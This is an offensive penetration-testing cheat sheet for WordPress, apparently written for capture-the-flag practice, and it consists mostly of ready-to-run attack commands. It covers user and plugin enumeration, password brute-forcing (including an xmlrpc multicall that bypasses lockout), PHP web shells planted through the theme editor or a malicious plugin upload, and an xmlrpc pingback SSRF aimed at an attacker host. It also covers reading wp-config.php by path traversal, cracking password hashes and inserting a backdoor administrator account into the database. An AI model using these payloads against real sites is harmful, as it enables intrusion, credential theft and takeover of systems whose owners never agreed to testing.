#WordPress #WP #CMS #webservices #wpscan

## What is WordPress?
Most widely deployed CMS — powers ~40% of the web. PHP-based, MySQL backend. Attack surface: plugin/theme vulnerabilities, xmlrpc.php abuse, weak credentials, file upload, user enumeration. Found constantly in HTB.

- Port: **TCP 80/443** (standard HTTP/HTTPS)
- Default web root: `/var/www/html/`
- Config file: `wp-config.php` — contains DB credentials
- Admin panel: `/wp-admin/` or `/wp-login.php`
- XML-RPC: `/xmlrpc.php`

---

## WordPress File Structure

```
wp-config.php           # DB creds, secret keys — high value target
wp-login.php            # Login page
wp-admin/               # Admin dashboard
wp-content/
├── plugins/            # Installed plugins
├── themes/             # Installed themes
└── uploads/            # User uploads (check for shells)
wp-includes/            # Core WordPress files
```

---

## Enumeration

### wpscan

```bash
# Install / update
gem install wpscan
wpscan --update

# Basic scan
wpscan --url http://<target>

# Enumerate everything (users, plugins, themes, config backups)
wpscan --url http://<target> -e ap,at,u,cb,dbe

# Enumerate specific items
wpscan --url http://<target> -e u          # users only
wpscan --url http://<target> -e ap         # all plugins
wpscan --url http://<target> -e at         # all themes
wpscan --url http://<target> -e vp         # vulnerable plugins only
wpscan --url http://<target> -e vt         # vulnerable themes only

# With API token (enables vuln data — get free token at wpscan.com)
wpscan --url http://<target> -e ap,at,u --api-token <TOKEN>

# Aggressive plugin detection (slower but more thorough)
wpscan --url http://<target> -e ap --plugins-detection aggressive

# Password spray / brute force
wpscan --url http://<target> -U admin -P /usr/share/wordlists/rockyou.txt
wpscan --url http://<target> -U users.txt -P passwords.txt --password-attack wp-login

# XML-RPC brute force (faster — multicall)
wpscan --url http://<target> -U admin -P /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc-multicall
```

### Manual Enumeration

```bash
# Check if WordPress
curl -s http://<target>/ | grep -i "wp-content\|wordpress\|wp-includes"

# Version detection
curl -s http://<target>/readme.html | grep -i "version"
curl -s http://<target>/wp-login.php | grep -i "ver="
curl -s "http://<target>/feed/" | grep -i "generator"

# User enumeration via author pages
curl -s http://<target>/?author=1
curl -s http://<target>/?author=2
# Redirect path reveals username: /author/<username>/

# User enumeration via REST API (WP 4.7+)
curl -s http://<target>/wp-json/wp/v2/users | python3 -m json.tool
curl -s http://<target>/wp-json/wp/v2/users?per_page=100

# List plugins
curl -s http://<target>/ | grep -oP 'wp-content/plugins/[^/]+' | sort -u

# List themes
curl -s http://<target>/ | grep -oP 'wp-content/themes/[^/]+' | sort -u

# Check xmlrpc.php
curl -s http://<target>/xmlrpc.php
# Returns: XML-RPC server accepts POST requests only = enabled

# Nmap
nmap -p 80 --script http-wordpress-enum,http-wordpress-users <target>
```

---

## Connect / Access

```bash
# Admin panel
http://<target>/wp-admin/
http://<target>/wp-login.php

# Login via curl
curl -c cookies.txt -d "log=admin&pwd=password&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
  http://<target>/wp-login.php

# REST API (no auth required for public endpoints)
curl http://<target>/wp-json/
curl http://<target>/wp-json/wp/v2/posts
curl http://<target>/wp-json/wp/v2/users
```

---

## Attack Vectors

### Admin Panel → RCE (Theme/Plugin Editor)

```bash
# After obtaining admin credentials:
# 1. Appearance → Theme Editor → select a PHP file (e.g. 404.php)
# 2. Insert PHP shell:
<?php system($_GET['cmd']); ?>
# 3. Save → trigger via URL:
curl "http://<target>/wp-content/themes/<theme>/404.php?cmd=id"

# Alternative: Plugins → Plugin Editor → select plugin PHP file → inject shell
```

### Admin Panel → RCE (Plugin Upload)

```bash
# Create malicious plugin ZIP
mkdir evil-plugin
cat > evil-plugin/evil-plugin.php << 'EOF'
<?php
/**
 * Plugin Name: Evil Plugin
 * Version: 1.0
 */
system($_GET['cmd']);
EOF
zip evil-plugin.zip evil-plugin/evil-plugin.php

# Upload: Plugins → Add New → Upload Plugin → install + activate
# Access:
curl "http://<target>/wp-content/plugins/evil-plugin/evil-plugin.php?cmd=id"

# Metasploit
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <target>
set USERNAME admin
set PASSWORD password
run
```

### xmlrpc.php Abuse

```bash
# Check if enabled
curl -s http://<target>/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'

# Brute force via multicall (bypasses lockout — one request, many attempts)
curl -s http://<target>/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><array><data>
          <value><string>admin</string></value>
          <value><string>password123</string></value>
        </data></array></value>
      </data></array></value></member>
    </struct></value>
  </data></array></value></param></params>
</methodCall>'

# SSRF via xmlrpc pingback — make WP server request internal URL
curl -s http://<target>/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://<attacker_ip>:<port>/</string></value></param>
    <param><value><string>http://<target>/?p=1</string></value></param>
  </params>
</methodCall>'
```

### wp-config.php Read (LFI / Path Traversal)

```bash
# If LFI exists in a plugin/theme:
curl "http://<target>/vuln.php?file=../../wp-config.php"

# wp-config.php contains:
# DB_NAME, DB_USER, DB_PASSWORD, DB_HOST
# Auth keys/salts

# Common config backup locations
curl http://<target>/wp-config.php.bak
curl http://<target>/wp-config.php.old
curl http://<target>/wp-config.php~
```

### Vulnerable Plugin/Theme Exploitation

```bash
# After identifying plugins via wpscan --api-token:
# wpscan will flag CVEs for installed plugin versions

# Common vulnerable plugins (historical — check current CVEs):
# - Duplicator (path traversal, arbitrary file read)
# - WP File Manager (unauthenticated RCE — CVE-2020-25213)
# - Contact Form 7 (file upload bypass)
# - Elementor (privilege escalation)
# - WooCommerce (various SQLi, auth bypass)

# Search for plugin vulns
wpscan --url http://<target> -e vp --api-token <TOKEN>
searchsploit wordpress <plugin_name>
```

### WP-Cron SSRF / DoS

```bash
# wp-cron.php — accessible without auth, triggers scheduled tasks
# Can be used for SSRF in some configurations
curl http://<target>/wp-cron.php?doing_wp_cron
```

### Database Access → Admin Hash

```bash
# If MySQL access obtained (from wp-config.php creds):
mysql -h <target> -u <wp_db_user> -p <wp_db_pass> <wp_db_name>

# Extract admin credentials
SELECT user_login, user_pass FROM wp_users;

# Password is PHPass (WordPress MD5) — crack with hashcat
# Mode 400 = phpass
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt

# Or insert new admin user
INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status)
VALUES ('hacker', MD5('Password123'), 'hacker@evil.com', NOW(), 0);

INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
```

---

## Dangerous Settings / Misconfigurations

| Setting | Risk |
|---|---|
| Default `admin` username | Username enumeration confirmed |
| Weak admin password | Brute forceable |
| xmlrpc.php enabled | Multicall brute force, SSRF |
| File editing enabled in admin | Theme/plugin editor → RCE |
| Outdated plugins/themes | Known CVE exploitation |
| `wp-config.php` readable via LFI | DB credentials, secret keys |
| REST API user enumeration enabled | Username list without auth |
| Debug mode enabled (`WP_DEBUG`) | Path/error disclosure |

---

## Quick Reference

| Goal | Command |
|---|---|
| Full enum | `wpscan --url http://host -e ap,at,u --api-token TOKEN` |
| User enum | `curl http://host/wp-json/wp/v2/users` |
| Plugin enum | `wpscan --url http://host -e ap --plugins-detection aggressive` |
| Password brute | `wpscan --url http://host -U admin -P rockyou.txt` |
| xmlrpc brute | `wpscan --url http://host -U admin -P rockyou.txt --password-attack xmlrpc-multicall` |
| Admin → RCE (MSF) | `exploit/unix/webapp/wp_admin_shell_upload` |
| WP hash crack | `hashcat -m 400 hashes.txt rockyou.txt` |
| DB user insert | `INSERT INTO wp_users ... + wp_usermeta administrator` |
